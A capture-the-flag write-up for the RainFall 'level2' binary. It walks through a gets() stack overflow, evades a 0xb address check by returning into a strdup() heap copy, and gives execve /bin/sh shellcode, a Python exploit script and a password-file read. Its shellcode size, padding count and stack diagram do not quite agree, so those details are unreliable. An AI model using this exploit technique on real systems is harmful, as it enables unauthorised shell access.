## Phase 1: Reconnaissance

We find a binary named `level2` in the home directory

Running the program allows us to input a string, which is then printed back

We copy the binary to our host machine for static analysis

---

## Phase 2: Static Analysis

By loading the binary into **Ghidra**, we identify the vulnerable function:

```c
void p(void)
{
    char buffer[76];  
    unsigned int addr;

    fflush(stdout);
    gets(buffer);     // Buffer overflow here?

    // Security Check
    if ((addr & 0xb0000000) == 0xb0000000)
    {
        printf("(%p)\n", addr);
        _exit(1);
    }

    puts(buffer);
    strdup(buffer);  // Copies buffer to the Heap
}
```
Whats happening:
- `gets()` reads user input into a 76 byte buffer with no safety checking
- An int `addr` is located just after the buffer on the stack
- There's a protection that checks if `addr` points into memory regions starting with `0xb` ...
  - This is blocking us from jumping to the stack (0xbfff...) or libc (0xb7...) since they both start with `0xb`

We cannot jump to the stack (shellcode) or libc (ret2libc) because those addresses start with `0xb`, triggering the `exit(1)`

So we need a memory region that does not start with `0xb`

---

## Phase 3: Understanding the Stack Layout

```text
HIGH ADDR
 ┌─────────────────────┐
 │    Function Args    │
 ├─────────────────────┤
 │   Return Address    │ <- We want to control this 
 ├─────────────────────┤
 │     Saved EBP       │ <- 4 bytes
 ├─────────────────────┤
 │   addr variable     │ <- 4 bytes (Must NOT be 0xb...)
 ├─────────────────────┤
 │       buffer        │ <- 76 bytes
 └─────────────────────┘
      LOW ADDR
```

1. `buffer` (76 bytes)
2. `addr` (unsigned int, 4 bytes)
3. Padding needed = 76 + 4 = 80 bytes

This means the 81st byte begins overwriting the Return Address

---

## Phase 4: Bypassing the Protection

Because stack and libc addresses are blocked, we need a valid executable address outside **0xb...**

1. `strdup()` copies our input string to the Heap
2. Heap addresses typically start with `0x08`
3. `0x08` does not trigger the `0xb0000000` protection check
4. The return value of `strdup()` (the pointer to our new heap location) is stored in the `$eax` register


So using this strategy, instead of jumping to the stack, we will instead do:
1. Inject our shellcode
2. Let `strdup()` move it to the Heap
3. Overwrite the return address to jump to that heap location !

---

## Phase 5: Constructing the Exploit

#### 1 - Finding the Address

We run the program in GDB to see where `strdup()` returns:
- We observe the return value in `$eax`
- The Heap Address: `0x0804a008`
- In little-endian format: `\x08\xa0\x04\x08`


#### 2 - The Payload Structure

We need to place our shellcode first, so the address we jump to executes valid instructions immediately
- Shellcode: 23 bytes (executes `/bin/sh`)
- Padding: Random data to reach the 80 byte offset
- Return Address: The address of our shellcode on the heap

We use this [https://shell-storm.org/shellcode/files/shellcode-827.html](shell-storm) to get a shellcode in asm that executes `/bin/sh` through `execve`
```text
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

Since our shellcode takes `23 bytes`, we need to reduce our padding to `57 bytes` to fill the buffer to `80 bytes`

---

## Phase 6: Execution


We go back in the VM and we create a Python script to generate the payload

```bash
level2@RainFall:~$ vim /tmp/exploit.py
level2@RainFall:~$ python /tmp/exploit.py > /tmp/payload
```

*exploit.py*:
```python3
#!/usr/bin/python3

import os;

shellcode = b'\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80';

padding = b'A' * (80 - len(shellcode))

ret_addr = b'\x08\xa0\x04\x08';

os.write(1, shellcode + padding + ret_addr)
```

Once the payload file is generated, we use the cat - trick to keep the standard input stream open so we can interact with the shell after the exploit lands


```shell
level2@RainFall:~$ cat /tmp/payload - | ./level2

(...raw output...)

whoami
level3
```

---

## Phase 7: Retrieving the Next Password

This reveals the flag for level3, allowing us to go to the next level

```shell
cat /home/user/level3/.pass
```



